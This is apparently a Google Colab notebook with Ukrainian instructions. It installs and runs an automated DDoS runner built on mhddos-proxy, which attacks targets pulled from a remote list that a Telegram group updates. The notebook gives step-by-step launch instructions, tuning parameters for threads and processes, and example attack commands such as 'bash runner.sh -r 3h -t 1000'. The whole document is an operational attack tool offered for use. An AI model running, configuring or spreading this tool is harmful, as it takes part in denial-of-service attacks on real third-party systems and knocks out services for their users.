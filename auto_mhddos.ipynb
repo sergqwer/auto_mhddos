{
 "nbformat": 4,
 "nbformat_minor": 0,
 "metadata": {
  "colab": {
   "name": "auto_mhddos.ipynb",
   "private_outputs": true,
   "provenance": [],
   "collapsed_sections": []
  },
  "kernelspec": {
   "name": "python3",
   "display_name": "Python 3"
  },
  "language_info": {
   "name": "python"
  }
 },
 "cells": [
  {
   "cell_type": "markdown",
   "source": [
    "###### Цей скрипт використовує [mhddos-proxy](https://github.com/porthole-ascend-cinnamon/mhddos_proxy) для атаки цілей [з цього списку](https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets). Цілі підбираються та оновлюються автоматично телеграм групою [Український Жнець](https://t.me/ukrainian_reaper_ddos). Весь код має вільний доступ та викладено [тут](https://github.com/white-sagittarius/auto_mhddos). Слава Україні!\n",
    "---\n",
    "<br/>\n",
    "\n",
    "### Запуск: меню \"Runtime\" -> \"Run all\" (Ctrl/⌘ + F9)\n",
    "### Зупинка або ручний рестарт: меню \"Runtime\" -> \"Mange sessions\" (можна зупиняти всі вкладки одночасно)\n",
    "\n",
    "###### Якщо ви не бачите меню вгорі, вимкніть AdBlock\n",
    "<br/>\n",
    "\n",
    "---"
   ],
   "metadata": {
    "id": "02jB8Um4KqQS"
   }
  },
  {
   "cell_type": "code",
   "source": [
    "!apt-get install ifstat -y &> /dev/null\n",
    "!apt-get upgrade ifstat -y &> /dev/null\n",
    "\n",
    "!python -m pip uninstall google-colab datascience -y &> /dev/null\n",
    "!python -m pip install --upgrade pip &> /dev/null\n",
    "\n",
    "%cd ~\n",
    "\n",
    "%rm -r auto_mhddos &> /dev/null\n",
    "!git clone https://github.com/white-sagittarius/auto_mhddos.git &> /dev/null\n",
    "%cd ~/auto_mhddos\n"
   ],
   "metadata": {
    "id": "iwL1D0yQ2Y5X"
   },
   "execution_count": null,
   "outputs": []
  },
  {
   "cell_type": "markdown",
   "source": [
    "### Будь ласка, очікуйте виводу інформації щодо поточного стану атаки. Для першого запуску це може зайняти кілька хвилин\n",
    "\n",
    "<details>\n",
    "  <summary><blockquote><i>для перегляду додаткових параметрів запуску натисніть на трикутник згори; це не обов'язково, лише для відладки та для впевнених користувачів</i></blockquote></summary>\n",
    "\n",
    "    `-r`, `--refresh-interval`. How frequently script should refresh targets. Download targets from [targets file](https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets) every NUMBER time units. SUFFIX may be \"m\" for minutes, \"h\" for hours or \"d\" for days. Suggested range: [10m, 1d]. Default: \"15m\"\n",
    "\n",
    "    `-p`, `--process-count`. How many separate [mhddos-proxy](https://github.com/porthole-ascend-cinnamon/mhddos_proxy) instances should run for each target. Note, _more_ is not necessarily _better_. It is important to monitor network stats. Suggested range [1, 8]. Default: \"5\"\n",
    "\n",
    "    `-t`, `--thread-count`. How many threads should send requests to a given target in parallel. Note, _more_ is not necessarily _better_. It is important to monitor network stats. Suggested range [250, 2000]. Default: \"1000\"\n",
    "\n",
    "    `-s`, `--stats-interval`. Frequentcy of network statistics output in seconds (i.e every N seconds). Format is \"HH:MM:SS\" - time in GMT+0, \"Mbps in\" - inbound traffic, \"Mbps out\" - outbound traffic. Example:\n",
    "    ```\n",
    "    [17:19:34]       0.37 ↓MBit/s↓        9.30 ↑MBit/s↑\n",
    "    [17:20:04]       0.37 ↓MBit/s↓        9.17 ↑MBit/s↑\n",
    "    [17:20:34]       0.40 ↓MBit/s↓        9.65 ↑MBit/s↑\n",
    "    ```\n",
    "    Suggested range [10, 300]. Default: \"30\"\n",
    "\n",
    "    Please note, that \"target\" is a single line from targets file here: https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets. This single line might contain multiple domains or IP addresses\n",
    "\n",
    "    ---\n",
    "\n",
    "    Example commands:\n",
    "\n",
    "    - Run DDoS attack with all defaults:\n",
    "    !bash runner.sh\n",
    "\n",
    "    - Run DDoS attack with with targets refreshed every 3 hours, spawning 1 mhddos proccess per target with 1000 threads each. Netwrok information is printed every 10 seconds:\n",
    "    !bash runner.sh --refresh-interval 3h --thread-count 1000 --process-count 1 --stats-interval 10\n",
    "\n",
    "    - Same command using short options:\n",
    "    !bash runner.sh -r 3h -t 1000 -p 1 -s 10\n",
    "\n",
    "    Long and short options can be mixed in a single command. Order of options does not matter. No options are required.\n",
    "</details>\n"
   ],
   "metadata": {
    "collapsed": false
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "### Поточний стан атаки\n",
    "###### [час, розбіжність 3 години] -> вхідна швидкість ↓MBit/s↓ -> вихідна швидкість ↑MBit/s↑"
   ],
   "metadata": {
    "id": "9ZHLG9gfB0eK"
   }
  },
  {
   "cell_type": "code",
   "source": [
    "!bash runner.sh"
   ],
   "metadata": {
    "id": "5R0oboScD87x"
   },
   "execution_count": null,
   "outputs": []
  }
 ]
}